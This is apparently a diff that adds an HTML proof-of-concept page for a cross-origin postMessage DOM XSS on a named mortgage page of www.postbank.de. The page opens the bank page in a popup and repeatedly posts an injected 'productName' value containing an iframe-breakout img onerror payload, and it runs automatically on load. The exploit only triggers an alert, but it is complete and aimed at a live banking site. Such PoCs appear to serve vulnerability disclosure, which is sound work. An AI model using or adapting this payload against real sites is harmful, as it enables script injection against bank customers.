@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Postbank BauFi postMessage DOM-XSS PoC</title>
+</head>
+<body>
+  <h2>Postbank www.postbank.de &mdash; cross-origin DOM XSS PoC</h2>
+  <p>This page (attacker origin) opens the Baufinanzierung page and postMessages a payload.
+  If marketing/retargeting cookies are accepted on postbank.de,
+  <code>alert(document.domain)</code> fires on <b>www.postbank.de</b>.</p>
+  <button onclick="go()">Run PoC</button>
+
+  <script>
+    var BAUFI = 'https://www.postbank.de/privatkunden/produkte/immobilien-finanzierung/baufinanzierung.html';
+    var PAYLOAD = {
+      leadstage: 'MQL',
+      productName: 'x"></iframe><img src=x onerror=alert(document.domain)>'
+    };
+
+    function go() {
+      var w = window.open(BAUFI, 'victim');        // open the vulnerable page in a popup
+      var n = 0;
+      var t = setInterval(function () {            // keep posting until the Launch rule is ready
+        n++;
+        try { w.postMessage(PAYLOAD, '*'); } catch (e) {}
+        if (n > 60) clearInterval(t);
+      }, 1500);
+    }
+
+    go();  // auto-run on page load
+  </script>
+</body>
+</html>
